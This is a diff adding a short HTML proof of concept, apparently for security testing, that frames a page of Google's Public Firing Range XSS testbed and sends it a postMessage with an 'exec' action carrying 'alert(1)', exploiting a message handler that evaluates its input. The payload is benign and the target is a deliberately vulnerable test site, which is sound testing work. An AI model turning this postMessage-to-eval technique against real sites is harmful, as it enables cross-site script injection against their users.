@@ -1,0 +1,22 @@
+<html>
+
+
+<body>
+	<iframe id="target" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval" onload="myFunction()">
+
+	</iframe>
+	
+
+	<script>
+		function myFunction() {
+			var target = document.getElementById('target');
+			var payload =  {"action": "exec",
+					"payload": "alert(1)"};
+			target.contentWindow.postMessage(payload, "*");
+		}
+	</script>
+
+</body>
+
+
+</html>
